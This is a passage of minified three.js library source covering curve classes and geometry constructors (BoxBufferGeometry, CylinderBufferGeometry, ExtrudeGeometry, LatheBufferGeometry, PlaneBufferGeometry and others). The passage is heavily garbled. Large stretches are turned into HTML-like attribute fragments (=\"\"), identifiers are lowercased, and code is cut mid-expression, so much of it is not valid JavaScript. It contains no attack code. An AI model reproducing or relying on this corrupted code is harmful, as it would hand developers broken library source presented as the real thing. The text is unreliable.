f;e++)k[e]=\"[];e=0;for(f=p.length;e<f;e++)for(g=m[e],n=0;n<g.length;n++){q=g[n];r=!0;for(t=0;t<p.length;t++)d(q.p,p[t].p)&&(e!==t&&h.push({froms:e,tos:t,hole:n}),r?(r=!1,k[t].push(q)):s=!0);r&&k[e].push(q)}0<h.length&&(s||(m=k))}s=0;for(e=p.length;s<e;s++)for(k=p[s].s,l.push(k),h=m[s],f=0,g=h.length;f<g;f++)k.holes.push(h[f].h);return\" l}});three.shape=\"function(){THREE.Path.apply(this,arguments);this.holes=[]};\" three.shape.prototype=\"Object.assign(Object.create(THREE.Path.prototype),{constructor:THREE.Shape,extrude:function(a){return\" new=\"\" three.extrudegeometry(this,a)},makegeometry:function(a){return=\"\" three.shapegeometry(this,a)},getpointsholes:function(a){for(var=\"\" b},extractallpoints:function(a){return{shape:this.getpoints(a),holes:this.getpointsholes(a)}},extractpoints:function(a){return=\"\" this.extractallpoints(a)}});=\"\" three.linecurve=\"function(a,b){this.v1=a;this.v2=b};THREE.LineCurve.prototype=Object.create(THREE.Curve.prototype);THREE.LineCurve.prototype.constructor=THREE.LineCurve;THREE.LineCurve.prototype.getPoint=function(a){var\" b};three.linecurve.prototype.getpointat=\"function(a){return\" this.getpoint(a)};three.linecurve.prototype.gettangent=\"function(a){return\" this.v2.clone().sub(this.v1).normalize()};=\"\" three.quadraticbeziercurve=\"function(a,b,c){this.v0=a;this.v1=b;this.v2=c};THREE.QuadraticBezierCurve.prototype=Object.create(THREE.Curve.prototype);THREE.QuadraticBezierCurve.prototype.constructor=THREE.QuadraticBezierCurve;THREE.QuadraticBezierCurve.prototype.getPoint=function(a){var\" three.vector2(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y))};=\"\" three.quadraticbeziercurve.prototype.gettangent=\"function(a){var\" three.vector2(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y))).normalize()};three.cubicbeziercurve=\"function(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d};THREE.CubicBezierCurve.prototype=Object.create(THREE.Curve.prototype);THREE.CubicBezierCurve.prototype.constructor=THREE.CubicBezierCurve;\" three.cubicbeziercurve.prototype.getpoint=\"function(a){var\" three.vector2(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y))};three.cubicbeziercurve.prototype.gettangent=\"function(a){var\" three.vector2(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y))).normalize()};three.splinecurve=\"function(a){this.points=void\" three.splinecurve.prototype=\"Object.create(THREE.Curve.prototype);THREE.SplineCurve.prototype.constructor=THREE.SplineCurve;THREE.SplineCurve.prototype.getPoint=function(a){var\" c=\"Math.floor(a);a-=c;var\" d=\"b[0===c?c:c-1],e=b[c],f=b[c\">b.length-2?b.length-1:c+1],b=b[c>b.length-3?b.length-1:c+2],c=THREE.CurveUtils.interpolate;return new THREE.Vector2(c(d.x,e.x,f.x,b.x,a),c(d.y,e.y,f.y,b.y,a))};\nTHREE.EllipseCurve=function(a,b,c,d,e,f,g,h){this.aX=a;this.aY=b;this.xRadius=c;this.yRadius=d;this.aStartAngle=e;this.aEndAngle=f;this.aClockwise=g;this.aRotation=h||0};THREE.EllipseCurve.prototype=Object.create(THREE.Curve.prototype);THREE.EllipseCurve.prototype.constructor=THREE.EllipseCurve;\nTHREE.EllipseCurve.prototype.getPoint=function(a){var b=this.aEndAngle-this.aStartAngle;0>b&&(b+=2*Math.PI);b>2*Math.PI&&(b-=2*Math.PI);b=!0===this.aClockwise?this.aEndAngle+(1-a)*(2*Math.PI-b):this.aStartAngle+a*b;a=this.aX+this.xRadius*Math.cos(b);var c=this.aY+this.yRadius*Math.sin(b);if(0!==this.aRotation){var b=Math.cos(this.aRotation),d=Math.sin(this.aRotation),e=a;a=(e-this.aX)*b-(c-this.aY)*d+this.aX;c=(e-this.aX)*d+(c-this.aY)*b+this.aY}return new THREE.Vector2(a,c)};\nTHREE.ArcCurve=function(a,b,c,d,e,f){THREE.EllipseCurve.call(this,a,b,c,c,d,e,f)};THREE.ArcCurve.prototype=Object.create(THREE.EllipseCurve.prototype);THREE.ArcCurve.prototype.constructor=THREE.ArcCurve;THREE.LineCurve3=THREE.Curve.create(function(a,b){this.v1=a;this.v2=b},function(a){var b=new THREE.Vector3;b.subVectors(this.v2,this.v1);b.multiplyScalar(a);b.add(this.v1);return b});\nTHREE.QuadraticBezierCurve3=THREE.Curve.create(function(a,b,c){this.v0=a;this.v1=b;this.v2=c},function(a){var b=THREE.ShapeUtils.b2;return new THREE.Vector3(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y),b(a,this.v0.z,this.v1.z,this.v2.z))});\nTHREE.CubicBezierCurve3=THREE.Curve.create(function(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d},function(a){var b=THREE.ShapeUtils.b3;return new THREE.Vector3(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y),b(a,this.v0.z,this.v1.z,this.v2.z,this.v3.z))});\nTHREE.SplineCurve3=THREE.Curve.create(function(a){console.warn(\"THREE.SplineCurve3 will be deprecated. Please use THREE.CatmullRomCurve3\");this.points=void 0==a?[]:a},function(a){var b=this.points;a*=b.length-1;var c=Math.floor(a);a-=c;var d=b[0==c?c:c-1],e=b[c],f=b[c>b.length-2?b.length-1:c+1],b=b[c>b.length-3?b.length-1:c+2],c=THREE.CurveUtils.interpolate;return new THREE.Vector3(c(d.x,e.x,f.x,b.x,a),c(d.y,e.y,f.y,b.y,a),c(d.z,e.z,f.z,b.z,a))});\nTHREE.CatmullRomCurve3=function(){function a(){}var b=new THREE.Vector3,c=new a,d=new a,e=new a;a.prototype.init=function(a,b,c,d){this.c0=a;this.c1=c;this.c2=-3*a+3*b-2*c-d;this.c3=2*a-2*b+c+d};a.prototype.initNonuniformCatmullRom=function(a,b,c,d,e,n,p){a=((b-a)/e-(c-a)/(e+n)+(c-b)/n)*n;d=((c-b)/n-(d-b)/(n+p)+(d-c)/p)*n;this.init(b,c,a,d)};a.prototype.initCatmullRom=function(a,b,c,d,e){this.init(b,c,e*(c-a),e*(d-b))};a.prototype.calc=function(a){var b=a*a;return this.c0+this.c1*a+this.c2*b+this.c3*\nb*a};return THREE.Curve.create(function(a){this.points=a||[];this.closed=!1},function(a){var g=this.points,h,k;k=g.length;2>k&&console.log(\"duh, you need at least 2 points\");a*=k-(this.closed?0:1);h=Math.floor(a);a-=h;this.closed?h+=0<h?0:(math.floor(math.abs(h) 0=\"==\" g.length)+1)*g.length:0=\"==a&&h===k-1&&(h=k-2,a=1);var\" l,n,p;this.closed||0<h?l=\"g[(h-1)%k]:(b.subVectors(g[0],g[1]).add(g[0]),l=b);n=g[h%k];p=g[(h+1)%k];this.closed||h+2<k?g=g[(h+2)%k]:(b.subVectors(g[k-1],g[k-2]).add(g[k-1]),g=b);if(void\" this.type||\"centripetal\"=\"==this.type||\" chordal\"=\"==this.type){var\"\" m=\"chordal\" ==\"=this.type?.5:.25;k=Math.pow(l.distanceToSquared(n),m);h=Math.pow(n.distanceToSquared(p),m);m=Math.pow(p.distanceToSquared(g),m);1E-4\">h&&(h=1);1E-4>k&&(k=h);1E-4>m&&(m=h);c.initNonuniformCatmullRom(l.x,n.x,p.x,g.x,k,h,m);d.initNonuniformCatmullRom(l.y,n.y,p.y,g.y,k,h,m);e.initNonuniformCatmullRom(l.z,n.z,p.z,g.z,k,h,m)}else\"catmullrom\"===this.type&&(k=void 0!==this.tension?this.tension:.5,c.initCatmullRom(l.x,n.x,p.x,g.x,\nk),d.initCatmullRom(l.y,n.y,p.y,g.y,k),e.initCatmullRom(l.z,n.z,p.z,g.z,k));return new THREE.Vector3(c.calc(a),d.calc(a),e.calc(a))})}();THREE.ClosedSplineCurve3=function(a){console.warn(\"THREE.ClosedSplineCurve3 has been deprecated. Please use THREE.CatmullRomCurve3.\");THREE.CatmullRomCurve3.call(this,a);this.type=\"catmullrom\";this.closed=!0};THREE.ClosedSplineCurve3.prototype=Object.create(THREE.CatmullRomCurve3.prototype);\nTHREE.BoxGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"BoxGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};this.fromBufferGeometry(new THREE.BoxBufferGeometry(a,b,c,d,e,f));this.mergeVertices()};THREE.BoxGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.BoxGeometry.prototype.constructor=THREE.BoxGeometry;THREE.CubeGeometry=THREE.BoxGeometry;\nTHREE.BoxBufferGeometry=function(a,b,c,d,e,f){function g(a,b,c,d,e,f,g,k,l,K,P){var M=f/l,H=g/K,L=f/2,O=g/2,N=k/2;g=l+1;for(var Q=K+1,J=f=0,D=new THREE.Vector3,G=0;G<q;g++)for(var aa=\"G*H-O,T=0;T<g;T++)D[a]=(T*M-L)*d,D[b]=aa*e,D[c]=N,p[r]=D.x,p[r+1]=D.y,p[r+2]=D.z,D[a]=0,D[b]=0,D[c]=0<k?1:-1,m[r]=D.x,m[r+1]=D.y,m[r+2]=D.z,q[s]=T/l,q[s+1]=1-G/K,r+=3,s+=2,f+=1;for(G=0;G<K;G++)for(T=0;T<l;T++)a=u+T+g*(G+1),b=u+(T+1)+g*(G+1),c=u+(T+1)+g*G,n[t]=u+T+g*G,n[t+1]=a,n[t+2]=c,n[t+3]=a,n[t+4]=b,n[t+5]=c,t+=6,\" j+=\"6;h.addGroup(v,J,P);v+=J;u+=f}THREE.BufferGeometry.call(this);this.type=\" boxbuffergeometry\";this.parameters=\"{width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};var\"\" h=\"this;d=Math.floor(d)||1;e=Math.floor(e)||1;f=Math.floor(f)||1;var\" k=\"function(a,b,c){a=0+(a+1)*(b+1)*2+(a+1)*(c+1)*2;return\" a+=\"(c+1)*(b+1)*2}(d,e,f),l=function(a,b,c){a=0+a*b*2+a*c*2;a+=c*b*2;return\" 6*a}(d,e,f),n=\"new\" (65535<l?uint32array:uint16array)(l),p=\"new\" float32array(3*k),m=\"new\" float32array(3*k),q=\"new\" float32array(2*=\"\" k),r=\"0,s=0,t=0,u=0,v=0;g(\" z\",\"y\",\"x\",-1,-1,c,b,a,f,e,0);g(\"z\",\"y\",\"x\",1,-1,c,b,-a,f,e,1);g(\"x\",\"z\",\"y\",1,1,a,c,b,d,f,2);g(\"x\",\"z\",\"y\",1,-1,a,c,-b,d,f,3);g(\"x\",\"y\",\"z\",1,-1,a,b,c,d,e,4);g(\"x\",\"y\",\"z\",-1,-1,a,b,-c,d,e,5);this.setindex(new\"=\"\" three.bufferattribute(n,1));this.addattribute(\"position\",new=\"\" three.bufferattribute(p,3));this.addattribute(\"normal\",new=\"\" three.bufferattribute(m,3));this.addattribute(\"uv\",new=\"\" three.bufferattribute(q,2))};three.boxbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);\" three.boxbuffergeometry.prototype.constructor=\"THREE.BoxBufferGeometry;THREE.CircleGeometry=function(a,b,c,d){THREE.Geometry.call(this);this.type=\" circlegeometry\";this.parameters=\"{radius:a,segments:b,thetaStart:c,thetaLength:d};this.fromBufferGeometry(new\"\" three.circlebuffergeometry(a,b,c,d))};three.circlegeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.CircleGeometry.prototype.constructor=THREE.CircleGeometry;\" three.circlebuffergeometry=\"function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\" circlebuffergeometry\";this.parameters=\"{radius:a,segments:b,thetaStart:c,thetaLength:d};a=a||50;b=void\"\" 0!=\"=b?Math.max(3,b):8;c=void\" e=\"b+2,f=new\" float32array(3*e),g=\"new\" float32array(3*e),e=\"new\" float32array(2*e);g[2]=\"1;e[0]=.5;e[1]=.5;for(var\" n=\"c+h/b*d;f[k]=a*Math.cos(n);f[k+1]=a*Math.sin(n);g[k+2]=1;e[l]=(f[k]/a+1)/2;e[l+1]=(f[k+1]/a+1)/2}c=\" [];for(k=\"1;k<=b;k++)c.push(k,k+1,0);this.setIndex(new\" three.bufferattribute(new=\"\" uint16array(c),1));this.addattribute(\"position\",new=\"\" three.bufferattribute(f,3));this.addattribute(\"normal\",new=\"\" three.bufferattribute(g,3));this.addattribute(\"uv\",new=\"\" three.bufferattribute(e,2));this.boundingsphere=\"new\" three.sphere(new=\"\" three.vector3,a)};three.circlebuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.CircleBufferGeometry.prototype.constructor=THREE.CircleBufferGeometry;\" three.cylinderbuffergeometry=\"function(a,b,c,d,e,f,g,h){function\" k(c){var=\"\" e,f,k,m=\"new\" three.vector2,n=\"new\" three.vector3,p=\"0,C=!0===c?a:b,M=!0===c?1:-1;f=u;for(e=1;e<=d;e++)r.setXYZ(u,0,w*M,0),s.setXYZ(u,0,M,0),m.x=.5,m.y=.5,t.setXY(u,m.x,m.y),u++;k=u;for(e=0;e<=d;e++){var\" n+1),v++,q.setx(v,n)),v++,q.setx(v,m),v++,p+=\"3;l.addGroup(E,p,!0===c?1:2);E+=p}THREE.BufferGeometry.call(this);this.type=\" cylinderbuffergeometry\";this.parameters=\"{radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};var\"\" l=\"this;a=void\" p=\"function(){var\" a=\"(d+1)*\" (e+1);!1=\"==f&&(a+=(d+1)*n+d*n);return\" a}(),m=\"function(){var\" a}(),q=\"new\" (65535<m?uint32array:uint16array)(m),1),r=\"new\" float32array(3*p),3),s=\"new\" float32array(3*p),3),t=\"new\" float32array(2*p),2),u=\"0,v=0,C=[],w=c/2,E=0;(function(){var\" f,k,m=\"new\" three.vector3,n=\"new\" m*math.sin(h*h+g);n.y=\"-P*c+w;n.z=M*Math.cos(H*h+g);r.setXYZ(u,n.x,n.y,n.z);m.copy(n);if(0===a&&0===k||0===b&&k===e)m.x=Math.sin(H*h+g),m.z=Math.cos(H*h+g);m.setY(Math.sqrt(m.x*m.x+m.z*m.z)*F).normalize();s.setXYZ(u,m.x,m.y,m.z);t.setXY(u,H,1-P);K.push(u);u++}C.push(K)}for(f=0;f<d;f++)for(k=0;k<e;k++)m=C[k+1][f],n=C[k+1][f+1],F=C[k][f+1],q.setX(v,C[k][f]),v++,q.setX(v,m),v++,q.setX(v,F),v++,q.setX(v,m),v++,q.setX(v,n),v++,q.setX(v,F),v++,p+=6;l.addGroup(E,p,0);E+=p})();!1===f&&(0<a&&k(!0),0<b&&k(!1));\" this.setindex(q);this.addattribute(\"position\",r);this.addattribute(\"normal\",s);this.addattribute(\"uv\",t)};three.cylinderbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.CylinderBufferGeometry.prototype.constructor=THREE.CylinderBufferGeometry;\" three.cylindergeometry=\"function(a,b,c,d,e,f,g,h){THREE.Geometry.call(this);this.type=\" cylindergeometry\";this.parameters=\"{radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};this.fromBufferGeometry(new\"\" three.cylinderbuffergeometry(a,b,c,d,e,f,g,h));this.mergevertices()};three.cylindergeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.CylinderGeometry.prototype.constructor=THREE.CylinderGeometry;\" three.conebuffergeometry=\"function(a,b,c,d,e,f,g){THREE.CylinderBufferGeometry.call(this,0,a,b,c,d,e,f,g);this.type=\" conebuffergeometry\";this.parameters=\"{radius:a,height:b,radialSegments:c,heightSegments:d,thetaStart:f,thetaLength:g}};THREE.ConeBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.ConeBufferGeometry.prototype.constructor=THREE.ConeBufferGeometry;\"\" three.conegeometry=\"function(a,b,c,d,e,f,g){THREE.CylinderGeometry.call(this,0,a,b,c,d,e,f,g);this.type=\" conegeometry\";this.parameters=\"{radius:a,height:b,radialSegments:c,heightSegments:d,openEnded:e,thetaStart:f,thetaLength:g}};THREE.ConeGeometry.prototype=Object.create(THREE.CylinderGeometry.prototype);THREE.ConeGeometry.prototype.constructor=THREE.ConeGeometry;\"\" three.edgesgeometry=\"function(a,b){function\" c(a,b){return=\"\" a-b}three.buffergeometry.call(this);var=\"\" d=\"Math.cos(THREE.Math.DEG2RAD*(void\" instanceof=\"\" three.buffergeometry?(h=\"new\" three.geometry,h.frombuffergeometry(a)):h=\"a.clone();h.mergeVertices();h.computeFaceNormals();var\">m;m++){e[0]=p[g[m]];e[1]=p[g[(m+1)%3]];e.sort(c);var q=e.toString();void 0===f[q]?f[q]={vert1:e[0],vert2:e[1],face1:l,\nface2:void 0}:f[q].face2=l}e=[];for(q in f)if(g=f[q],void 0===g.face2||h[g.face1].normal.dot(h[g.face2].normal)<=d)l=k[g.vert1],e.push(l.x),e.push(l.y),e.push(l.z),l=k[g.vert2],e.push(l.x),e.push(l.y),e.push(l.z);this.addattribute(\"position\",new three.bufferattribute(new=\"\" float32array(e),3))};three.edgesgeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.EdgesGeometry.prototype.constructor=THREE.EdgesGeometry;\" three.extrudegeometry=\"function(a,b){\" undefined\"!=\"=typeof\"\" a&&(three.geometry.call(this),this.type=\"ExtrudeGeometry\" ,a=\"Array.isArray(a)?a:[a],this.addShapeList(a,b),this.computeFaceNormals())};THREE.ExtrudeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ExtrudeGeometry.prototype.constructor=THREE.ExtrudeGeometry;THREE.ExtrudeGeometry.prototype.addShapeList=function(a,b){for(var\" c=\"a.length,d=0;d<c;d++)this.addShape(a[d],b)};\" three.extrudegeometry.prototype.addshape=\"function(a,b){function\" c(a,b,c){b||console.error(\"three.extrudegeometry:=\"\" vec=\"\" does=\"\" not=\"\" exist\");return=\"\" b.clone().multiplyscalar(c).add(a)}function=\"\" d(a,b,c){var=\"\" d=\"1,d=a.x-b.x,e=a.y-b.y,f=c.x-a.x,g=c.y-a.y,h=d*d+e*e;if(Math.abs(d*g-e*f)\">Number.EPSILON){var k=Math.sqrt(h),l=Math.sqrt(f*f+g*g),h=b.x-e/k;b=b.y+d/k;f=((c.x-g/l-h)*g-(c.y+f/l-b)*f)/(d*g-e*f);c=h+d*f-a.x;a=b+e*f-a.y;d=c*c+a*a;if(2>=d)return new THREE.Vector2(c,a);d=Math.sqrt(d/2)}else a=!1,d>Number.EPSILON?\nf>Number.EPSILON&&(a=!0):d<-number.epsilon?f<-number.epsilon&&(a=!0):math.sign(e)===math.sign(g)&&(a=!0),a?(c=-e,a=d,d=math.sqrt(h)):(c=d,a=e,d=math.sqrt(h 2));return=\"\" new=\"\" three.vector2(c=\"\" d,a=\"\" d)}function=\"\" e(a,b){var=\"\" c,d;for(g=\"a.length;0<=--G;){c=G;d=G-1;0\">d&&(d=a.length-1);for(var e=0,f=q+2*n,e=0;e<f;e++){var g=\"Q*e,h=Q*(e+1),k=b+c+g,g=b+d+g,l=b+d+h,h=b+c+h,k=k+B,g=g+B,l=l+B,h=h+B;I.faces.push(new\" three.face3(k,g,h,null,null,1));i.faces.push(new=\"\" three.face3(g,l,h,null,null,1));k=\"u.generateSideWallUV(I,\" k,g,l,h);i.facevertexuvs[0].push([k[0],k[1],k[3]]);i.facevertexuvs[0].push([k[1],k[2],k[3]])}}}function=\"\" f(a,b,c){i.vertices.push(new=\"\" three.vector3(a,b,c))}function=\"\" g(a,b,c){a+=\"B;b+=B;c+=B;I.faces.push(new\" three.face3(a,b,c,null,null,0));a=\"u.generateTopUV(I,a,b,c);I.faceVertexUvs[0].push(a)}var\" h=\"void\" 0!=\"=b.amount?b.amount:100,k=void\" m=\"void\" three.tubegeometry.frenetframes(r,q,!1),c=\"new\" three.vector3,w=\"new\" three.vector3,e=\"new\" three.vector3);p||(l=\"k=n=0);var\" z,y,a,i=\"this,B=this.vertices.length,r=a.extractPoints(m),m=r.shape,F=r.holes;if(r=!THREE.ShapeUtils.isClockWise(m)){m=m.reverse();\" y=\"0;for(A=F.length;y<A;y++)z=F[y],THREE.ShapeUtils.isClockWise(z)&&(F[y]=z.reverse());r=!1}var\" k=\"THREE.ShapeUtils.triangulateShape(m,F),P=m;y=0;for(A=F.length;y<A;y++)z=F[y],m=m.concat(z);var\" m,h,l,o,n,q=\"m.length,J,D=K.length,r=[],G=0;L=P.length;M=L-1;for(H=G+1;G<L;G++,M++,H++)M===L&&(M=0),H===L&&(H=0),r[G]=d(P[G],P[M],P[H]);var\" aa=\"[],T,X=r.concat();y=0;for(A=F.length;y<A;y++){z=F[y];T=[];G=0;L=z.length;M=L-1;for(H=G+1;G<L;G++,M++,H++)M===L&&(M=0),H===L&&(H=0),T[G]=d(z[G],z[M],z[H]);aa.push(T);X=\" x.concat(t)}for(m=\"0;M<n;M++){L=M/n;O=k*(1-L);H=l*Math.sin(L*Math.PI/2);G=0;for(L=P.length;G<L;G++)N=c(P[G],r[G],H),f(N.x,N.y,-O);y=0;for(A=F.length;y<A;y++)for(z=F[y],T=aa[y],G=0,L=z.length;G<L;G++)N=c(z[G],T[G],H),f(N.x,N.y,-O)}H=l;for(G=0;G<Q;G++)N=p?c(m[G],X[G],H):m[G],t?(w.copy(v.normals[0]).multiplyScalar(N.x),C.copy(v.binormals[0]).multiplyScalar(N.y),E.copy(s[0]).add(w).add(C),f(E.x,E.y,E.z)):f(N.x,N.y,0);for(L=1;L<=q;L++)for(G=0;G<Q;G++)N=p?c(m[G],X[G],H):m[G],t?(w.copy(v.normals[L]).multiplyScalar(N.x),\" c.copy(v.binormals[l]).multiplyscalar(n.y),e.copy(s[l]).add(w).add(c),f(e.x,e.y,e.z)):f(n.x,n.y,h=\"\" q*l);for(m=\"n-1;0<=M;M--){L=M/n;O=k*(1-L);H=l*Math.sin(L*Math.PI/2);G=0;for(L=P.length;G<L;G++)N=c(P[G],r[G],H),f(N.x,N.y,h+O);y=0;for(A=F.length;y<A;y++)for(z=F[y],T=aa[y],G=0,L=z.length;G<L;G++)N=c(z[G],T[G],H),t?f(N.x,N.y+s[q-1].y,s[q-1].x+O):f(N.x,N.y,h+O)}(function(){if(p){var\" a;a=\"0*Q;for(G=0;G<D;G++)J=K[G],g(J[2]+a,J[1]+a,J[0]+a);a=q+2*n;a*=Q;for(G=0;G<D;G++)J=K[G],g(J[0]+a,J[1]+a,J[2]+a)}else{for(G=\" 0;g<d;g++)j=\"K[G],g(J[2],J[1],J[0]);for(G=0;G<D;G++)J=K[G],g(J[0]+Q*q,J[1]+Q*q,J[2]+Q*q)}})();(function(){var\" a=\"0;e(P,a);a+=P.length;y=0;for(A=F.length;y<A;y++)z=F[y],e(z,a),a+=z.length})()};\" three.extrudegeometry.worlduvgenerator=\"{generateTopUV:function(a,b,c,d){a=a.vertices;b=a[b];c=a[c];d=a[d];return[new\" three.vector2(b.x,b.y),new=\"\" three.vector2(c.x,c.y),new=\"\" three.vector2(d.x,d.y)]},generatesidewalluv:function(a,b,c,d,e){a=\"a.vertices;b=a[b];c=a[c];d=a[d];e=a[e];return.01\">Math.abs(b.y-c.y)?[new THREE.Vector2(b.x,1-b.z),new THREE.Vector2(c.x,1-c.z),new THREE.Vector2(d.x,1-d.z),new THREE.Vector2(e.x,1-e.z)]:[new THREE.Vector2(b.y,1-b.z),new THREE.Vector2(c.y,1-c.z),new THREE.Vector2(d.y,\n1-d.z),new THREE.Vector2(e.y,1-e.z)]}};THREE.ShapeGeometry=function(a,b){THREE.Geometry.call(this);this.type=\"ShapeGeometry\";!1===Array.isArray(a)&&(a=[a]);this.addShapeList(a,b);this.computeFaceNormals()};THREE.ShapeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ShapeGeometry.prototype.constructor=THREE.ShapeGeometry;THREE.ShapeGeometry.prototype.addShapeList=function(a,b){for(var c=0,d=a.length;c<d;c++)this.addshape(a[c],b);return 0=\"==b&&(b={});var\" this};=\"\" three.shapegeometry.prototype.addshape=\"function(a,b){void\" c=\"b.material,d=void\" 0!=\"=b.curveSegments?b.curveSegments:12);var\" k=\"e.shape,l=e.holes;if(!THREE.ShapeUtils.isClockWise(k))for(k=k.reverse(),e=0,f=l.length;e<f;e++)g=l[e],THREE.ShapeUtils.isClockWise(g)&&(l[e]=g.reverse());var\" n=\"THREE.ShapeUtils.triangulateShape(k,l);e=0;for(f=l.length;e<f;e++)g=l[e],k=k.concat(g);\" l=\"k.length;f=n.length;for(e=0;e<l;e++)g=k[e],this.vertices.push(new\" three.vector3(g.x,g.y,0));for(e=\"0;e<f;e++)l=n[e],k=l[0]+h,g=l[1]+h,l=l[2]+h,this.faces.push(new\" three.face3(k,g,l,null,null,c)),this.facevertexuvs[0].push(d.generatetopuv(this,k,g,l))};=\"\" three.lathebuffergeometry=\"function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\" lathebuffergeometry\";this.parameters=\"{points:a,segments:b,phiStart:c,phiLength:d};b=Math.floor(b)||12;c=c||0;d=d||2*Math.PI;d=THREE.Math.clamp(d,0,2*Math.PI);for(var\"\" e=\"(b+1)*a.length,f=b*a.length*6,g=new\" three.bufferattribute(new=\"\" (65535<f?uint32array:uint16array)(f),1),h=\"new\" float32array(3*e),3),k=\"new\" float32array(2*e),2),l=\"0,n=0,p=1/b,m=new\" three.vector3,q=\"new\" three.vector2,=\"\" f=\"c+e*p*d,r=Math.sin(f),s=Math.cos(f),f=0;f<=a.length-1;f++)m.x=a[f].x*r,m.y=a[f].y,m.z=a[f].x*s,h.setXYZ(l,m.x,m.y,m.z),q.x=e/b,q.y=f/(a.length-1),k.setXY(l,q.x,q.y),l++;for(e=0;e<b;e++)for(f=0;f<a.length-1;f++)c=f+e*a.length,l=c+a.length,p=c+a.length+1,m=c+1,g.setX(n,c),n++,g.setX(n,l),n++,g.setX(n,m),n++,g.setX(n,l),n++,g.setX(n,p),n++,g.setX(n,m),n++;this.setIndex(g);this.addAttribute(\" position\",h);this.addattribute(\"uv\",k);this.computevertexnormals();if(d=\"==2*Math.PI)for(d=\"\" this.attributes.normal.array,g=\"new\" three.vector3,h=\"new\" three.vector3,k=\"new\" three.vector3,c=\"b*a.length*3,f=e=0;e<a.length;e++,f+=3)g.x=d[f+0],g.y=d[f+1],g.z=d[f+2],h.x=d[c+f+0],h.y=d[c+f+1],h.z=d[c+f+2],k.addVectors(g,h).normalize(),d[f+0]=d[c+f+0]=k.x,d[f+1]=d[c+f+1]=k.y,d[f+2]=d[c+f+2]=k.z};THREE.LatheBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.LatheBufferGeometry.prototype.constructor=THREE.LatheBufferGeometry;\" three.lathegeometry=\"function(a,b,c,d){THREE.Geometry.call(this);this.type=\" lathegeometry\";this.parameters=\"{points:a,segments:b,phiStart:c,phiLength:d};this.fromBufferGeometry(new\"\" three.lathebuffergeometry(a,b,c,d));this.mergevertices()};three.lathegeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.LatheGeometry.prototype.constructor=THREE.LatheGeometry;\" three.planegeometry=\"function(a,b,c,d){THREE.Geometry.call(this);this.type=\" planegeometry\";this.parameters=\"{width:a,height:b,widthSegments:c,heightSegments:d};this.fromBufferGeometry(new\"\" three.planebuffergeometry(a,b,c,d))};three.planegeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.PlaneGeometry.prototype.constructor=THREE.PlaneGeometry;\" three.planebuffergeometry=\"function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\" planebuffergeometry\";this.parameters=\"{width:a,height:b,widthSegments:c,heightSegments:d};var\"\" g=\"c+1,h=d+1,k=a/c,l=b/d;b=new\" float32array(g*h*3);a=\"new\" float32array(g*h*3);for(var=\"\" float32array(g*h*2),p=\"0,m=0,q=0;q<h;q++)for(var\" r=\"q*l-f,s=0;s<g;s++)b[p]=s*k-e,b[p+1]=-r,a[p+2]=1,n[m]=s/c,n[m+1]=1-q/d,p+=3,m+=2;p=0;e=new\" (65535<b.length=\"\" 3?uint32array:uint16array)(c*=\"\" d*6);for(q=\"0;q<d;q++)for(s=0;s<c;s++)f=s+g*(q+1),h=s+1+g*(q+1),k=s+1+g*q,e[p]=s+g*q,e[p+1]=f,e[p+2]=k,e[p+3]=f,e[p+4]=h,e[p+5]=k,p+=6;this.setIndex(new\" three.bufferattribute(e,1));this.addattribute(\"position\",new=\"\" three.bufferattribute(b,3));this.addattribute(\"normal\",new=\"\" three.bufferattribute(a,3));this.addattribute(\"uv\",new=\"\" three.bufferattribute(n,2))};three.planebuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.PlaneBufferGeometry.prototype.constructor=THREE.PlaneBufferGeometry;\" three.ringbuffergeometry=\"function(a,b,c,d,e,f){THREE.BufferGeometry.call(this);this.type=\" ringbuffergeometry\";this.parameters=\"{innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};a=a||20;b=b||50;e=void\"\" (65535<h?uint32array:uint16array)(h),1),k=\"new\" float32array(3*g),3),l=\"new\" float32array(3*=\"\" g),3),g=\"new\" float32array(2*g),2),n=\"0,p=0,m,q=a,r=(b-a)/d,s=new\" three.vector3,t=\"new\" 